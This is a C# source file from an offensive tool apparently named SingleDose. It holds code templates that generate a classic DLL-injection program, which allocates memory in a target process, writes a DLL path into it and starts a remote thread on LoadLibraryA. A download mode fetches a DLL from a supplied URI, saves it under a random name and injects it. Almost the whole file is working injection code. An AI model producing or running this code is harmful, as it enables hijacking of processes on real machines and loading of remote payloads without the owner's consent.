namespace SingleDose
{
    class DLL_CRT
    {
        public static string DYNAMICMODE = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-dll"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""-pid: pid of target process \n-dll: dll to inject"");
                Environment.Exit(0);
            }
            ArgValues dynamicArgs= ArgParse(args);
            if (dynamicArgs.TargetProcessHandle != null && dynamicArgs.DLLPath != null){
                InjectDLL(dynamicArgs.TargetProcessHandle, dynamicArgs.DLLPath);
            }";

        public static string DOWNLOADMODE = @"
            if (args.Contains(""-h"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-pid"", StringComparer.OrdinalIgnoreCase) || !args.Contains(""-uri"", StringComparer.OrdinalIgnoreCase))
            {
                Console.WriteLine(""-pid: pid of target process \n-uri: uri for download"");
                Environment.Exit(0);
            }
            
            ArgValues dynamicArgs = ArgParse(args);
            if (dynamicArgs != null)
            {
                Console.WriteLine(dynamicArgs.DownloadURI);
                if (dynamicArgs.DownloadURI != null)
                {
                    try
                    {
                        var wc = new WebClient();
                        byte[] dllDownload = wc.DownloadData(dynamicArgs.DownloadURI);
                        string pwd = Directory.GetCurrentDirectory();
                        string dllDownloadPath = pwd +@""\""+ Path.GetRandomFileName().Split('.')[0] + "".dll""; //You can hardcode a filename here by replacing the ""Path.GetRandomFileName().Split('.')"" with whatever filename you want
                        File.WriteAllBytes(dllDownloadPath, dllDownload);
                        if (File.Exists(dllDownloadPath))
                        {
                            Console.WriteLine(""[!!] ARTIFACT: {0}"", dllDownloadPath);
                            InjectDLL(dynamicArgs.TargetProcessHandle, dllDownloadPath);
                        }
                        else
                        {
                            Console.WriteLine(""[!] File doesn't exist"");
                        }
                        
                    }
                    catch
                    {
                        Console.WriteLine(""[-]"");
                        Environment.Exit(0);
                    }
                }   
            }
        ";

        //{{0}} = process pid or name
        //{{1}} = absolute path to dll
        public static string STATICMODE = @"
            if (args.Contains(""-h"") || args.Contains(""-H""))
            {
                Console.WriteLine(""No flags."");
                Environment.Exit(0);
            }
            string target = ""{{0}}"";
            int targetPid;
            if (int.TryParse(target, out targetPid))
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.Id == targetPid)
                    {
                        try
                        {
                            InjectDLL(p.Handle, @""{{1}}"");
                        }
                        catch (Exception)
                        {
                            Console.WriteLine(""[!] Error"");
                        }
                    }
                }
            } 
            else if (!int.TryParse(target, out targetPid))
            {
                foreach (Process p in Process.GetProcesses())
                {
                    if (p.ProcessName == target)
                    {
                        try
                        {
                            InjectDLL(p.Handle, @""{{1}}"");
                        }
                        catch (Exception)
                        {
                            Console.WriteLine(""[!] Error"");
                        }
                    }
                }
            }
        ";

        public static string DYNAMICARGPARSE = @"
        
        public class ArgValues
        {
            public IntPtr TargetProcessHandle;
            public string DLLPath;
        }
        
        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();

            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        int pidValue;
                        if (!arguments[i + 1].StartsWith(""-"") && int.TryParse(arguments[i + 1], out pidValue))
                        {
                            foreach (Process p in Process.GetProcesses())
                            {
                                if (p.Id == pidValue)
                                {
                                    collection.TargetProcessHandle = p.Handle;
                                    break;
                                }
                            }
                            i++;
                        }
                        else
                        {
                            Console.WriteLine(""[!] Invalid PID supplied."");
                            return null;
                        }
                    }
                    
                    if (arguments[i].ToUpper().StartsWith(""-DLL"") && arguments[i + 1] != null)
                    {
                        if (File.Exists(arguments[i + 1]))
                        {
                            collection.DLLPath = Path.GetFullPath(arguments[i + 1]);
                        }
                        else if (!File.Exists(arguments[i + 1]))
                        {
                            Console.WriteLine(""[!] Invalid DLL path supplied."");
                            return null;
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }

            return collection;   
        }";

        public static string DOWNLOADARGPARSE = @"
        public class ArgValues
        {
            public IntPtr TargetProcessHandle;
            public string DownloadURI;
        }

        static ArgValues ArgParse(string[] arguments)
        {
            ArgValues collection = new ArgValues();
            if (arguments.Count() != 0)
            {
                for (var i = 0; i < arguments.Count(); i++)
                {
                    if (arguments[i].ToUpper().StartsWith(""-PID"") && arguments[i + 1] != null)
                    {
                        int pidValue;
                        if (!arguments[i + 1].StartsWith(""-"") && int.TryParse(arguments[i + 1], out pidValue))
                        {
                            foreach (Process p in Process.GetProcesses())
                            {
                                if (p.Id == pidValue)
                                {
                                    collection.TargetProcessHandle = p.Handle;
                                    break;
                                }
                            }
                            i++;
                        }
                        else
                        {
                            Console.WriteLine(""[!] Invalid PID supplied."");
                            return null;
                        }
                    }

                    if (arguments[i].ToUpper().StartsWith(""-URI"") && arguments[i + 1] != null)
                    {
                        if (arguments[i + 1] != null)
                        {
                            collection.DownloadURI = arguments[i + 1];
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine(""[!] No args specified"");
            }
            return collection;
        }";

        public static string BODY = @"
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace {{NAMESPACE}}
{
    class Program
    {
        
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;

        static void Main(string[] args)
        {
            {{TRIGGER}}
            {{MODE}}
        }

        static void InjectDLL(IntPtr procHandle, string dllName)
        {
            IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(""kernel32.dll""), ""LoadLibraryA"");
            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            IntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, Encoding.Default.GetBytes(dllName), (uint)((dllName.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
            CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, allocMemAddress, 0, IntPtr.Zero);
            if (Marshal.GetLastWin32Error().ToString() != null)
            {
                Console.WriteLine(""[+] Success!"");
                Environment.Exit(0);
            }
        }

        {{ARGS}}
        {{PINVOKE}}
    }
}";
    }
}
